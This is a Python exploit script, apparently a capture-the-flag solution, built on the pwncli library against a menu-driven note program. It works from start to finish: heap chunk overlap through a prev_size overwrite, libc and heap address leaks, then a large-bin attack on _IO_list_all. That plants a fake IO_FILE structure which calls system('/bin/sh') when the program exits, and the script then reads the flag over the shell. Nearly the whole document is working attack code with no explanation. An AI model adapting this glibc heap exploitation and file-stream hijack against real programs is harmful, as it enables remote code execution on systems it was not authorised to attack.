#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def increase(size, data="deadbeef"):
    io.sendlineafter("Five: Finished!\n\n", "1")
    io.sendlineafter("Number of words?\n", str(size))
    io.sendafter("please input U character\n", data)


def edit(idx, data):
    io.sendlineafter("Five: Finished!\n\n", "2")
    io.sendlineafter("please input the page U want 2 change\n", str(idx))
    io.sendafter("Now Change U this page :", data)


def dele(idx):
    io.sendlineafter("Five: Finished!\n\n", "3")
    io.sendlineafter("please Input the page U want 2 tear off\n", str(idx))

def scan(idx):
    io.sendlineafter("Five: Finished!\n\n", "4")
    io.sendlineafter("please Input The page U want 2 scan\n", str(idx))


def fini():
    io.sendlineafter("Five: Finished!\n\n", "5")


io.sendlineafter("Please Write U Name on the Book\n\n", "roderick")
increase(0x440) # 0
increase(0x448) # 1
increase(0x4f0) # 2
increase(0x440) # 3

dele(0)
edit(1, b"a"*0x440+p64(0x8a0))
dele(2)

increase(0x440) # 4
scan(1)
libc_base = recv_current_libc_addr(offset=0x3ebca0)
log_libc_base_addr(libc_base)
libc.address = libc_base

increase(0x448) # 5 1
increase(0x4f0) # 6

increase(0x440) # 7
increase(0x448, flat({0x440:"\x01"})) # 8
increase(0x450) # 9
increase(0x440) # 10
dele(7)
dele(9)

increase(0x500) # 11

increase(0x440, "a"*8) # 12
scan(12)
m = io.recvline()
heapaddr = u64_ex(m[8:-1])
log_address("heap address", heapaddr)

dele(1)
f = IO_FILE_plus_struct()
pay = f.getshell_by_str_jumps_finish_when_exit(libc_base + 0x3e8360, libc.sym.system, libc.search(b"/bin/sh").__next__())

increase(0x450, flat({0x58:heapaddr+0x110,
    0xb0:0xffffffffffffffff,
    0x100: pay
}) + b"\n") # 13

dele(13)
edit(5, p64(0x3ec0a0 + libc_base) + p64(libc.sym['_IO_list_all']-0x10)[:7]+b"\n")

increase(0x500)

fini()

io.sendline("cat flag")

io.interactive()